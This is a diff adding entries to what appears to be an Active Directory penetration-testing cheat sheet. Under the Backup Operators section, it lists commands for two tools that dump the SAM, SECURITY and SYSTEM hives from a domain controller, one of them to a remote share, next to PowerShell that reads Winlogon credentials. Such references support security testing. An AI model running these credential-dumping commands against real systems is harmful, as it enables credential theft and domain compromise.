@@ -2966,6 +2966,9 @@ This groups grants the following privileges :
   $winlogon = $reg.OpenSubKey('SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon')
   $winlogon.GetValueNames() | foreach {"$_ : $(($winlogon).GetValue($_))"}
   ```
+* Retrieve SAM,SECURITY and SYSTEM hives
+  * [mpgn/BackupOperatorToDA](https://github.com/mpgn/BackupOperatorToDA): `.\BackupOperatorToDA.exe -t \\dc1.lab.local -u user -p pass -d domain -o \\10.10.10.10\SHARE\`
+  * [improsec/BackupOperatorToolkit](https://github.com/improsec/BackupOperatorToolkit): `.\BackupOperatorToolkit.exe DUMP \\PATH\To\Dump \\TARGET.DOMAIN.DK`
 
 
 ### Abusing Active Directory ACLs/ACEs
